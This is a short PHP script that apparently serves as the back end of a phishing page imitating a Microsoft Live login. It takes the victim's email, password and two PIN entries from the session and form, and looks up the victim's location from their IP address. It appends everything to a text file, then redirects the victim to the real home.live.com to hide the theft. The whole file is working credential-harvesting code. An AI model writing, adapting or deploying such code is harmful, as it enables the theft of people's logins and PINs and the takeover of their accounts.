<?php
session_start();
date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$ct = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));

if(isset($_POST["pos"]) && isset($_POST["pl4"])){
  

  
  $file = fopen("ali.txt", "a");
fwrite($file, "Correo: ".$_SESSION['cx30']." - Psswrd: ".$_SESSION['cxc']." - Pin: ".$_POST['pos']." - Repin: ".$_POST['pl4']."\r\nFecha: ".date('d-m-Y')." | ".date('H:i:s')."\r\n".$cc." ".$ct." ".$userp." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);
unset ($_SESSION['cx30']);
unset ($_SESSION['cxc']);

  echo "<script>";
  echo "window.location.href='https://home.live.com/?mkt=es-es';";
  echo "</script>";
  

}
  
?>